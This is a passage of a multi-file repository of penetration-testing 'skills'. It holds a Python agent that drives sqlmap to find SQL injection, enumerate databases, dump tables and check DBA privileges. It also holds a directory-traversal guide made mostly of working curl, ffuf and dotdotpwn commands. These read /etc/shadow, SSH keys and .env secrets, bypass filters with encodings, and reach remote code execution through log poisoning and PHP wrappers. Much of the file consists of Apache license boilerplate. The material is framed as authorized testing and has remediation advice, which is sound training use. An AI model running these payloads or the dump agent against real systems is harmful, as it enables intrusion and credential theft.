@@ -1,0 +1,1202 @@
+[PART 8/14]
+-----
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-with-sqlmap/references/api-reference.md #####
+# API Reference: sqlmap Automation Agent
+
+## Dependencies
+
+| Library | Version | Purpose |
+|---------|---------|---------|
+| sqlmap | >=1.7 | SQL injection detection and exploitation (subprocess) |
+
+## CLI Usage
+
+```bash
+# Detection scan
+python scripts/agent.py --url "https://target.com/page?id=1" --param id --action detect
+
+# Enumerate databases
+python scripts/agent.py --url "https://target.com/page?id=1" --action dbs
+
+# List tables
+python scripts/agent.py --url "https://target.com/page?id=1" --action tables --database target_db
+
+# Dump table rows
+python scripts/agent.py --url "https://target.com/page?id=1" --action dump \
+  --database target_db --table users
+
+# Check privileges
+python scripts/agent.py --url "https://target.com/page?id=1" --action privs
+```
+
+## Functions
+
+### `find_sqlmap() -> str`
+Searches common paths for the sqlmap binary.
+
+### `run_detection_scan(sqlmap_bin, url, param, request_file, cookie, tamper) -> dict`
+Runs `sqlmap --batch --random-agent` and parses output for injectability, DB type, and techniques.
+
+### `enumerate_databases(sqlmap_bin, url, param, cookie) -> list`
+Runs `sqlmap --dbs` and extracts database names from output.
+
+### `enumerate_tables(sqlmap_bin, url, database, param, cookie) -> list`
+Runs `sqlmap -D db --tables` and parses table names.
+
+### `dump_table(sqlmap_bin, url, database, table, columns, limit, param, cookie) -> dict`
+Runs `sqlmap -D db -T tbl --dump --start=1 --stop=N`.
+
+### `check_privileges(sqlmap_bin, url, param, cookie) -> dict`
+Runs `--current-user --current-db --is-dba` to assess DB privileges.
+
+## sqlmap Flags Used
+
+| Flag | Purpose |
+|------|---------|
+| `--batch` | Non-interactive mode |
+| `--random-agent` | Randomize User-Agent header |
+| `-p` | Specify injectable parameter |
+| `--tamper` | Apply WAF bypass tamper scripts |
+| `--dbs` | Enumerate databases |
+| `--tables` | Enumerate tables |
+| `--dump` | Extract table data |
+| `--is-dba` | Check DBA privileges |
+
+## Output Schema
+
+```json
+{
+  "action": "detect",
+  "url": "https://target.com/page?id=1",
+  "result": {
+    "injectable": true,
+    "database": "MySQL",
+    "techniques": ["boolean-based", "UNION query"]
+  }
+}
+```
+
+##### END FILE #####
+
+##### FILE: exploiting-sql-injection-with-sqlmap/scripts/agent.py #####
+#!/usr/bin/env python3
+# For authorized testing in lab/CTF environments only
+"""sqlmap automation agent for orchestrating SQL injection scans via subprocess."""
+
+import argparse
+import json
+import logging
+import subprocess
+import sys
+from datetime import datetime
+from typing import List, Optional
+
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+logger = logging.getLogger(__name__)
+
+
+def find_sqlmap() -> str:
+    """Locate the sqlmap executable."""
+    for path in ["sqlmap", "sqlmap.py", "/usr/bin/sqlmap", "/usr/local/bin/sqlmap"]:
+        try:
+            subprocess.run([path, "--version"], capture_output=True, timeout=5)
+            return path
+        except (FileNotFoundError, subprocess.TimeoutExpired):
+            continue
+    sys.exit("sqlmap not found. Install: pip install sqlmap")
+
+
+def run_detection_scan(sqlmap_bin: str, url: str, param: Optional[str] = None,
+                        request_file: Optional[str] = None,
+                        cookie: str = "", tamper: str = "") -> dict:
+    """Run sqlmap detection scan and parse results."""
+    cmd = [sqlmap_bin, "--batch", "--random-agent", "--output-dir=/tmp/sqlmap_out"]
+
+    if request_file:
+        cmd.extend(["-r", request_file])
+    else:
+        cmd.extend(["-u", url])
+
+    if param:
+        cmd.extend(["-p", param])
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+    if tamper:
+        cmd.extend(["--tamper", tamper])
+
+    logger.info("Running: %s", " ".join(cmd))
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+
+    output = result.stdout
+    injectable = "is vulnerable" in output.lower() or "injectable" in output.lower()
+    db_type = _extract_db_type(output)
+    techniques = _extract_techniques(output)
+
+    return {
+        "scan_type": "detection",
+        "url": url or request_file,
+        "injectable": injectable,
+        "database": db_type,
+        "techniques": techniques,
+        "exit_code": result.returncode,
+    }
+
+
+def enumerate_databases(sqlmap_bin: str, url: str, param: Optional[str] = None,
+                         cookie: str = "") -> List[str]:
+    """Enumerate databases using sqlmap --dbs."""
+    cmd = [sqlmap_bin, "-u", url, "--dbs", "--batch", "--random-agent"]
+    if param:
+        cmd.extend(["-p", param])
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+    databases = []
+    in_db_section = False
+    for line in result.stdout.split("\n"):
+        if "available databases" in line.lower():
+            in_db_section = True
+            continue
+        if in_db_section and line.strip().startswith("[*]"):
+            db_name = line.strip().replace("[*] ", "")
+            databases.append(db_name)
+        elif in_db_section and not line.strip():
+            break
+
+    logger.info("Found %d databases", len(databases))
+    return databases
+
+
+def enumerate_tables(sqlmap_bin: str, url: str, database: str,
+                      param: Optional[str] = None, cookie: str = "") -> List[str]:
+    """Enumerate tables in a specific database."""
+    cmd = [sqlmap_bin, "-u", url, "-D", database, "--tables",
+           "--batch", "--random-agent"]
+    if param:
+        cmd.extend(["-p", param])
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+    tables = []
+    for line in result.stdout.split("\n"):
+        stripped = line.strip()
+        if stripped.startswith("| ") and not stripped.startswith("+-"):
+            table_name = stripped.strip("| ").strip()
+            if table_name and table_name != "Table":
+                tables.append(table_name)
+
+    logger.info("Found %d tables in %s", len(tables), database)
+    return tables
+
+
+def dump_table(sqlmap_bin: str, url: str, database: str, table: str,
+                columns: Optional[List[str]] = None, limit: int = 10,
+                param: Optional[str] = None, cookie: str = "") -> dict:
+    """Dump rows from a specific table with optional column and row limit."""
+    cmd = [sqlmap_bin, "-u", url, "-D", database, "-T", table, "--dump",
+           "--start=1", f"--stop={limit}", "--batch", "--random-agent"]
+    if columns:
+        cmd.extend(["-C", ",".join(columns)])
+    if param:
+        cmd.extend(["-p", param])
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+    return {
+        "database": database,
+        "table": table,
+        "limit": limit,
+        "output": result.stdout[-2000:] if len(result.stdout) > 2000 else result.stdout,
+        "exit_code": result.returncode,
+    }
+
+
+def check_privileges(sqlmap_bin: str, url: str, param: Optional[str] = None,
+                      cookie: str = "") -> dict:
+    """Check current database user and DBA privileges."""
+    cmd = [sqlmap_bin, "-u", url, "--current-user", "--current-db", "--is-dba",
+           "--batch", "--random-agent"]
+    if param:
+        cmd.extend(["-p", param])
+    if cookie:
+        cmd.extend(["--cookie", cookie])
+
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+    output = result.stdout
+
+    current_user = _extract_value(output, "current user")
+    current_db = _extract_value(output, "current database")
+    is_dba = "true" in output.lower().split("current user is DBA")[-1][:20].lower() if "current user is DBA" in output else False
+
+    return {"current_user": current_user, "current_db": current_db, "is_dba": is_dba}
+
+
+def _extract_db_type(output: str) -> str:
+    for db in ["MySQL", "PostgreSQL", "Microsoft SQL Server", "Oracle", "SQLite"]:
+        if db.lower() in output.lower():
+            return db
+    return "unknown"
+
+
+def _extract_techniques(output: str) -> List[str]:
+    techniques = []
+    for tech in ["boolean-based", "error-based", "UNION query", "stacked queries",
+                 "time-based", "inline query"]:
+        if tech.lower() in output.lower():
+            techniques.append(tech)
+    return techniques
+
+
+def _extract_value(output: str, label: str) -> str:
+    for line in output.split("\n"):
+        if label.lower() in line.lower():
+            parts = line.split(":")
+            if len(parts) > 1:
+                return parts[-1].strip().strip("'\"")
+    return ""
+
+
+def main():
+    parser = argparse.ArgumentParser(description="sqlmap Automation Agent")
+    parser.add_argument("--url", required=True, help="Target URL with injectable param")
+    parser.add_argument("--param", help="Specific parameter to test")
+    parser.add_argument("--cookie", default="", help="Cookie header value")
+    parser.add_argument("--tamper", default="", help="Tamper scripts (comma-separated)")
+    parser.add_argument("--action", choices=["detect", "dbs", "tables", "dump", "privs"],
+                         default="detect")
+    parser.add_argument("--database", help="Database name for table/dump actions")
+    parser.add_argument("--table", help="Table name for dump action")
+    parser.add_argument("--output", default="sqlmap_report.json")
+    args = parser.parse_args()
+
+    sqlmap_bin = find_sqlmap()
+    report = {"action": args.action, "url": args.url, "timestamp": datetime.utcnow().isoformat()}
+
+    if args.action == "detect":
+        report["result"] = run_detection_scan(sqlmap_bin, args.url, args.param,
+                                               cookie=args.cookie, tamper=args.tamper)
+    elif args.action == "dbs":
+        report["databases"] = enumerate_databases(sqlmap_bin, args.url, args.param, args.cookie)
+    elif args.action == "tables" and args.database:
+        report["tables"] = enumerate_tables(sqlmap_bin, args.url, args.database, args.param, args.cookie)
+    elif args.action == "dump" and args.database and args.table:
+        report["dump"] = dump_table(sqlmap_bin, args.url, args.database, args.table,
+                                     param=args.param, cookie=args.cookie)
+    elif args.action == "privs":
+        report["privileges"] = check_privileges(sqlmap_bin, args.url, args.param, args.cookie)
+
+    with open(args.output, "w") as f:
+        json.dump(report, f, indent=2)
+    logger.info("Report saved to %s", args.output)
+    print(json.dumps(report, indent=2))
+
+
+if __name__ == "__main__":
+    main()
+
+##### END FILE #####
+
+##### FILE: performing-directory-traversal-testing/SKILL.md #####
+---
+name: performing-directory-traversal-testing
+description: Test web applications for path traversal and Local/Remote File Inclusion
+  vulnerabilities by manipulating file path parameters, applying encoding and filter-bypass
+  techniques, automating discovery with ffuf and dotdotpwn, and reading high-value files
+  or achieving code execution. Use during authorized penetration tests of file download,
+  view, or include functionality, or when assessing APIs that accept file names or file
+  paths as parameters.
+domain: cybersecurity
+subdomain: web-application-security
+tags:
+- penetration-testing
+- directory-traversal
+- path-traversal
+- lfi
+- owasp
+- web-security
+version: '1.0'
+author: mahipal
+license: Apache-2.0
+nist_csf:
+- PR.PS-01
+- ID.RA-01
+- PR.DS-10
+- DE.CM-01
+mitre_attack:
+- T1190
+- T1059.007
+- T1505.003
+- T1083
+---
+
+# Performing Directory Traversal Testing
+
+## When to Use
+
+- During authorized penetration tests when the application handles file paths in URL parameters or request bodies
+- When testing file download, file view, or file include functionality
+- For assessing Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities
+- When evaluating template engines, logging systems, or report generators that reference files
+- During security assessments of APIs that accept file names or paths as parameters
+
+## Prerequisites
+
+- **Authorization**: Written penetration testing agreement for the target
+- **Burp Suite Professional**: For intercepting and modifying file path parameters
+- **ffuf**: For fuzzing file path parameters with traversal payloads
+- **dotdotpwn**: Automated directory traversal fuzzer (`apt install dotdotpwn`)
+- **SecLists**: Traversal payload wordlists from Daniel Miessler's collection
+- **curl**: For manual testing of traversal payloads
+
+## Workflow
+
+### Step 1: Identify File Path Parameters
+
+Find application endpoints that reference files through parameters.
+
+```bash
+# Common file-handling patterns to look for:
+# /download?file=report.pdf
+# /view?page=about.html
+# /api/files?path=documents/invoice.pdf
+# /template?name=header.html
+# /include?module=sidebar
+# /image?src=photos/avatar.jpg
+# /export?format=csv&template=default
+
+# In Burp Suite, search proxy history for file-related parameters
+# Filter by parameter names: file, path, page, template, include,
+# module, src, doc, document, folder, dir, name, filename
+
+# Test with a known valid file to establish baseline
+curl -s "https://target.example.com/download?file=report.pdf" -o /dev/null -w "%{http_code} %{size_download}"
+
+# Try referencing a file that shouldn't be accessible
+curl -s "https://target.example.com/download?file=../../../etc/passwd"
+```
+
+### Step 2: Test Basic Directory Traversal Payloads
+
+Attempt to escape the intended directory and read sensitive files.
+
+```bash
+# Linux traversal payloads
+PAYLOADS=(
+  "../../../etc/passwd"
+  "../../../../etc/passwd"
+  "../../../../../etc/passwd"
+  "../../../../../../etc/passwd"
+  "../../../../../../../etc/passwd"
+  "..%2f..%2f..%2fetc%2fpasswd"
+  "..%252f..%252f..%252fetc%252fpasswd"
+  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+  "....//....//....//etc/passwd"
+  "..;/..;/..;/etc/passwd"
+)
+
+for payload in "${PAYLOADS[@]}"; do
+  echo -n "Testing: $payload -> "
+  response=$(curl -s "https://target.example.com/download?file=$payload")
+  if echo "$response" | grep -q "root:"; then
+    echo "VULNERABLE"
+  else
+    echo "Blocked"
+  fi
+done
+
+# Windows traversal payloads
+WIN_PAYLOADS=(
+  "..\..\..\windows\win.ini"
+  "..%5c..%5c..%5cwindows%5cwin.ini"
+  "..\/..\/..\/windows/win.ini"
+  "....\\....\\....\\windows\\win.ini"
+)
+
+for payload in "${WIN_PAYLOADS[@]}"; do
+  echo -n "Testing: $payload -> "
+  curl -s "https://target.example.com/download?file=$payload" | head -c 100
+  echo
+done
+```
+
+### Step 3: Apply Encoding and Filter Bypass Techniques
+
+Use various encoding schemes to bypass input validation filters.
+
+```bash
+# URL encoding bypass
+curl -s "https://target.example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+
+# Double URL encoding
+curl -s "https://target.example.com/download?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+
+# UTF-8 encoding
+curl -s "https://target.example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+
+# Null byte injection (PHP < 5.3.4)
+curl -s "https://target.example.com/download?file=../../../etc/passwd%00.pdf"
+
+# Path truncation (Windows)
+# Exceeding MAX_PATH (260 chars) to bypass extension checks
+LONG_PATH="../../../etc/passwd"
+for i in $(seq 1 200); do LONG_PATH="${LONG_PATH}/."; done
+curl -s "https://target.example.com/download?file=$LONG_PATH"
+
+# Case manipulation (Windows)
+curl -s "https://target.example.com/download?file=..\..\..\..\WiNdOwS\win.ini"
+
+# Dot-dot-slash variations
+curl -s "https://target.example.com/download?file=....//....//....//etc/passwd"
+curl -s "https://target.example.com/download?file=....//../../../etc/passwd"
+
+# Using absolute path (if filter only blocks relative traversal)
+curl -s "https://target.example.com/download?file=/etc/passwd"
+```
+
+### Step 4: Automate with ffuf and dotdotpwn
+
+Use automated tools for comprehensive traversal testing.
+
+```bash
+# ffuf with traversal payload list
+ffuf -u "https://target.example.com/download?file=FUZZ" \
+  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -mc 200 \
+  -fs 0 \
+  -t 20 -rate 50 \
+  -o traversal-results.json -of json
+
+# dotdotpwn for systematic traversal testing
+dotdotpwn -m http-url \
+  -u "https://target.example.com/download?file=TRAVERSAL" \
+  -k "root:" \
+  -o /tmp/dotdotpwn-results.txt \
+  -d 8 -t 200
+
+# Burp Intruder approach:
+# 1. Send request to Intruder
+# 2. Mark the file parameter value as insertion point
+# 3. Load LFI payload list from SecLists
+# 4. Add Grep Match rules for: "root:", "[extensions]", "for 16-bit"
+# 5. Start attack and review matches
+```
+
+### Step 5: Test Local File Inclusion (LFI) for Code Execution
+
+If LFI is confirmed, attempt to escalate to remote code execution.
+
+```bash
+# PHP LFI to RCE via log poisoning
+# Step 1: Inject PHP code into access log
+curl -s -A "<?php system(\$_GET['cmd']); ?>" \
+  "https://target.example.com/"
+
+# Step 2: Include the log file via LFI
+curl -s "https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id"
+
+# PHP wrapper for file read (base64 encode to avoid parsing)
+curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode/resource=config.php"
+
+# PHP wrapper for code execution
+curl -s -X POST \
+  -d "<?php system('id'); ?>" \
+  "https://target.example.com/page?file=php://input"
+
+# PHP data wrapper
+curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
+
+# Include /proc/self/environ (if readable)
+curl -s -A "<?php phpinfo(); ?>" \
+  "https://target.example.com/page?file=../../../proc/self/environ"
+
+# Session file inclusion
+# Write PHP code into session via another parameter
+# Then include: /tmp/sess_<PHPSESSID>
+```
+
+### Step 6: Read High-Value Files
+
+Target sensitive configuration and credential files.
+
+```bash
+# Linux high-value files
+HIGH_VALUE_LINUX=(
+  "/etc/passwd"
+  "/etc/shadow"
+  "/etc/hosts"
+  "/etc/hostname"
+  "/proc/self/environ"
+  "/proc/self/cmdline"
+  "/var/www/html/.env"
+  "/var/www/html/config.php"
+  "/var/www/html/wp-config.php"
+  "/home/user/.ssh/id_rsa"
+  "/home/user/.bash_history"
+  "/root/.bash_history"
+  "/var/log/auth.log"
+)
+
+for file in "${HIGH_VALUE_LINUX[@]}"; do
+  traversal="../../../../../../..$file"
+  echo -n "$file: "
+  response=$(curl -s "https://target.example.com/download?file=$traversal")
+  if [ ${#response} -gt 10 ]; then
+    echo "READABLE (${#response} bytes)"
+  else
+    echo "Not accessible"
+  fi
+done
+
+# Windows high-value files
+HIGH_VALUE_WIN=(
+  "C:\\Windows\\win.ini"
+  "C:\\Windows\\System32\\drivers\\etc\\hosts"
+  "C:\\inetpub\\wwwroot\\web.config"
+  "C:\\Users\\Administrator\\.ssh\\id_rsa"
+  "C:\\xampp\\apache\\conf\\httpd.conf"
+  "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
+)
+```
+
+## Key Concepts
+
+| Concept | Description |
+|---------|-------------|
+| **Directory Traversal** | Using `../` sequences to navigate to parent directories and access files outside the intended path |
+| **Local File Inclusion (LFI)** | Server-side inclusion of local files, potentially leading to code execution |
+| **Remote File Inclusion (RFI)** | Including files from external URLs (requires `allow_url_include=On` in PHP) |
+| **Null Byte Injection** | Using `%00` to truncate file paths, bypassing extension checks in older PHP versions |
+| **PHP Wrappers** | Protocols like `php://filter`, `php://input`, `data://` for reading and executing files |
+| **Log Poisoning** | Injecting code into log files and then including them via LFI for code execution |
+| **Path Canonicalization** | The process of resolving relative paths to absolute paths, which can be exploited |
+
+## Tools & Systems
+
+| Tool | Purpose |
+|------|---------|
+| **Burp Suite Professional** | Request interception and Intruder for automated payload testing |
+| **ffuf** | Fast fuzzing with LFI/traversal wordlists |
+| **dotdotpwn** | Dedicated directory traversal fuzzer with multiple traversal patterns |
+| **LFISuite** | Automated LFI exploitation tool with multiple techniques |
+| **SecLists** | Comprehensive wordlists including LFI payloads and traversal patterns |
+| **Kadimus** | LFI scanning and exploitation tool |
+
+## Common Scenarios
+
+### Scenario 1: File Download Traversal
+A document download endpoint at `/download?file=report.pdf` does not validate the file parameter. Replacing the value with `../../../etc/passwd` returns the server's password file.
+
+### Scenario 2: Template LFI to RCE
+A PHP application includes templates via `?page=home`. By poisoning the Apache access log with PHP code in the User-Agent header, then including the log file, the attacker achieves remote code execution.
+
+### Scenario 3: Image Path Traversal
+An image resizing service accepts `?src=images/photo.jpg`. The application strips `../` once but does not recurse, so `....//....//etc/passwd` bypasses the filter.
+
+### Scenario 4: Windows IIS Configuration Leak
+A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\..\web.config` exposes the IIS configuration file containing database connection strings.
+
+## Output Format
+
+```
+## Directory Traversal Finding
+
+**Vulnerability**: Path Traversal / Local File Inclusion
+**Severity**: High (CVSS 8.6)
+**Location**: GET /download?file=../../../etc/passwd
+**OWASP Category**: A01:2021 - Broken Access Control
+
+### Reproduction Steps
+1. Navigate to https://target.example.com/download?file=report.pdf
+2. Replace file parameter: ?file=../../../etc/passwd
+3. Server returns contents of /etc/passwd
+
+### Files Retrieved
+| File | Impact |
+|------|--------|
+| /etc/passwd | User enumeration (42 accounts) |
+| /var/www/html/.env | Database credentials exposed |
+| /home/deploy/.ssh/id_rsa | SSH private key recovered |
+| /proc/self/environ | Environment variables with API keys |
+
+### Filter Bypass Required
+Original `../` stripped by filter. Successful bypass: `....//....//....//etc/passwd`
+
+### Recommendation
+1. Use an allowlist of permitted file names rather than accepting arbitrary paths
+2. Resolve the canonical path and verify it stays within the intended directory
+3. Run the web server with minimal file system permissions
+4. Remove sensitive files from web-accessible directories
+5. Disable PHP wrappers (allow_url_include, allow_url_fopen) if not required
+```
+
+##### END FILE #####
+
+##### FILE: performing-directory-traversal-testing/LICENSE #####
+
+                                 Apache License
+                           Version 2.0, January 2004
+                        http://www.apache.org/licenses/
+
+   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION
+
+   1. Definitions.
+
+      "License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+
+      "Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+
+      "You" (or "Your") shall mean an individual or Legal Entity
+      exercising permissions granted by this License.
+
+      "Source" form shall mean the preferred form for making modifications,
+      including but not limited to software source code, documentation
+      source, and configuration files.
+
+      "Object" form shall mean any form resulting from mechanical
+      transformation or translation of a Source form, including but
+      not limited to compiled object code, generated documentation,
+      and conversions to other media types.
+
+      "Work" shall mean the work of authorship, whether in Source or
+      Object form, made available under the License, as indicated by a
+      copyright notice that is included in or attached to the work
+      (an example is provided in the Appendix below).
+
+      "Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+
+      "Contribution" shall mean any work of authorship, including
+      the original version of the Work and any modifications or additions
+      to that Work or Derivative Works thereof, that is intentionally
+      submitted to the Licensor for inclusion in the Work by the copyright owner
+      or by an individual or Legal Entity authorized to submit on behalf of
+      the copyright owner. For the purposes of this definition, "submitted"
+      means any form of electronic, verbal, or written communication sent
+      to the Licensor or its representatives, including but not limited to
+      communication on electronic mailing lists, source code control systems,
+      and issue tracking systems that are managed by, or on behalf of, the
+      Licensor for the purpose of discussing and improving the Work, but
+      excluding communication that is conspicuously marked or otherwise
+      designated in writing by the copyright owner as "Not a Contribution."
+
+      "Contributor" shall mean Licensor and any individual or Legal Entity
+      on behalf of whom a Contribution has been received by the Licensor and
+      subsequently incorporated within the Work.
+
+   2. Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+
+   3. Grant of Patent License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      (except as stated in this section) patent license to make, have made,
+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
